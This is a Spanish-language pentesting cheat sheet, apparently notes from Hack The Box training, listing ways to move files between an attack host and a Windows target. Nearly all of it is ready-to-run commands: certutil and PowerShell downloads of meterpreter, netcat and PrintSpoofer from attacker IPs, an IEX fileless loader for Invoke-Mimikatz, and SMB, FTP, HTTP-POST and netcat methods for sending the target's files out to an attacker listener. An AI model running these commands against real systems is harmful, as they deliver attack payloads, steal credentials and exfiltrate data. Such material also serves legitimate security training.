Formas de transpasar archivos desde maquina atacante a atacado, implica levantar un servidor web para subir los archivos (python3 -m http.server 80)
[Lista de ejemplos para windows](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

certutil -urlcache -f http://10.10.5.4/meterpreter.exe nombreguardado.exe  
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe

iwr http://10.13.90.137/PrintSpoofer.exe -OutFile C:\Users\Bob\Desktop\PrintSpoofer.exe
curl
wget

A veces esta habilitado wget y curl

-----------
### PowerShell
En cualquier versión de PowerShell, la clase [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) se puede usar para descargar un archivo a través de `HTTP`, `HTTPS` o `FTP`

| **Método**                                                                                                               | **Descripción**                                                                                                               |
| ------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Devuelve los datos de un recurso como un [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Devuelve los datos de un recurso sin bloquear el hilo de llamada.                                                             |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Descarga datos de un recurso y devuelve un array de bytes.                                                                    |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Descarga datos de un recurso y devuelve un array de bytes sin bloquear el hilo de llamada.                                    |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Descarga datos de un recurso a un archivo local.                                                                              |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Descarga datos de un recurso a un archivo local sin bloquear el hilo de llamada.                                              |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Descarga una cadena (String) de un recurso y devuelve una cadena (String).                                                    |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Descarga una cadena (String) de un recurso sin bloquear el hilo de llamada.                                                   |

```
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```
```
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

###### Para casos con fileless, iex ([Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) iex alias) aplica ejecución inmediata
```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

--------------------
### SMB (montar servidor local y descargar desde host)
Podemos usar SMB para descargar archivos desde nuestra Pwnbox fácilmente. Necesitamos crear un servidor SMB en nuestra Pwnbox con [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) de Impacket y luego usar `copy`, `move`, `Copy-Item` de PowerShell o cualquier otra herramienta que permita la conexión a SMB.

levanto servidor smb
```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
en host final descargo lo que necesito
```
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

### FTP (montar servidor local y descargar desde host)
Podemos configurar un servidor FTP en nuestro host de ataque usando el módulo `pyftpdlib` de Python3

levantar servidor ftp (por defecto pyftpdlib usa 2121)
```
sudo python3 -m pyftpdlib --port 21
```
en host final descargo lo que necesito
```
 (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

#### Powershell
Copiar samplefile.txt desde nuestro Localhost a la Sesión de DATABASE01
```
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
Copiar DATABASE.txt desde la Sesión de DATABASE01 a nuestro Localhost
```
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

----------------
### Subida de archivos

##### Http
montar servidor web que permita subirle archivos desde host
```
pip3 install uploadserver
```
```
python3 -m uploadserver
```
desde host remoto
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

##### Netcat
host remoto apuntar a puerto mandando request
```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
en host local quedarse en escucha en puerto donde recibira cosas, en este ejemplo llega un string en base64
```
nc -lvnp 8000
```

##### FTP
host local
```
sudo python3 -m pyftpdlib --port 21 --write
```
host remoto
```
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
tambien se puede crear un archivo para correrlo continuo
```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
